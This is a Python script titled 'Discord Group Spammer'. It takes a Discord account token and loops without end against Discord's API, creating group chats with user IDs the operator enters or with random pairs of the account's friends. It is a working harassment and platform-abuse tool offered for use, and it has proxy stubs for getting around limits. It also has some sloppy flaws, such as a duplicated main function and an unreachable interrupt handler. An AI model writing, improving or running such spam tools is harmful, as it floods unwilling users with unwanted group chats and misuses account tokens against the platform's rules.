import requests
import random
from time import sleep
from pystyle import Colors, Colorate

def clear():
    print("\033c", end="")

async def main():
    clear()
    print(Colorate.Horizontal(Colors.blue_to_purple, "============================================="))
    print(Colorate.Horizontal(Colors.blue_to_purple, "           Discord Group Spammer             "))
    print(Colorate.Horizontal(Colors.blue_to_purple, "============================================="))

def proxy():
    return None

def getheaders(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    return headers

def setTitle(title):
    print(f"\033]0;{title}\007")

def selector(token, users):
    clear()
    while True:
        try:
            response = requests.post(f'https://discordapp.com/api/v9/users/@me/channels', proxies=proxy(), headers=getheaders(token), json={"recipients": users})

            if response.status_code == 204 or response.status_code == 200:
                print(Colorate.Color(Colors.green, "[!] Created groupchat"))
            elif response.status_code == 429:
                print(Colorate.Color(Colors.red, f"[!] Rate limited ({response.json()['retry_after']}ms)"))
            else:
                print(Colorate.Color(Colors.red, f"[!] Error: {response.status_code}"))
        except Exception:
            pass
        except KeyboardInterrupt:
            break

def randomizer(token, ID):
    while True:
        users = random.sample(ID, 2)
        try:
            response = requests.post(f'https://discordapp.com/api/v9/users/@me/channels', proxies={"http": f'{proxy()}'}, headers=getheaders(token), json={"recipients": users})

            if response.status_code == 204 or response.status_code == 200:
                print(Colorate.Color(Colors.green, "[!] Created groupchat"))
            elif response.status_code == 429:
                print(Colorate.Color(Colors.red, f"[!] Rate limited ({response.json()['retry_after']}ms)"))
            else:
                print(Colorate.Color(Colors.red, f"[!] Error: {response.status_code}"))
        except Exception:
            pass
        except KeyboardInterrupt:
            break

def main():
    print(Colorate.Color(Colors.blue_to_purple, "Enter the token of the account you want to Spam"))
    token = input("Token: ")

    print(Colorate.Color(Colors.blue_to_purple, '\nDo you want to choose user(s) yourself to groupchat spam or do you want to select randoms?'))
    print(Colorate.Color(Colors.blue_to_purple, '''
    [01] choose user(s) yourself
    [02] randomize the users
                    '''))
    secondchoice = int(input('Choice: '))

    if secondchoice not in [1, 2]:
        input(Colorate.Color(Colors.red, '[!] Invalid Second Choice'))
        return

    if secondchoice == 1:
        setTitle("Creating groupchats")
        print(Colorate.Color(Colors.blue_to_purple, '\nInput the users you want to create a groupchat with (separate by , id,id2,id3)'))
        recipients = input('Users ID: ')
        user = recipients.split(',')
        if "," not in recipients:
            input(Colorate.Color(Colors.red, "\n[!] You didn't have any commas (,) format is id,id2,id3"))
            return
        input(Colorate.Color(Colors.blue_to_purple, '\n\n\nPress enter to continue ("ctrl + c" at anytime to stop)'))
        selector(token, user)

    elif secondchoice == 2:
        setTitle("Creating groupchats")
        IDs = []
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'http://{proxy()}'}, headers=getheaders(token)).json()
        for friend in friendIds:
            IDs.append(friend['id'])
        input(Colorate.Color(Colors.blue_to_purple, 'Press enter to continue ("ctrl + c" at anytime to stop)'))
        randomizer(token, IDs)

if __name__ == "__main__":
    main()
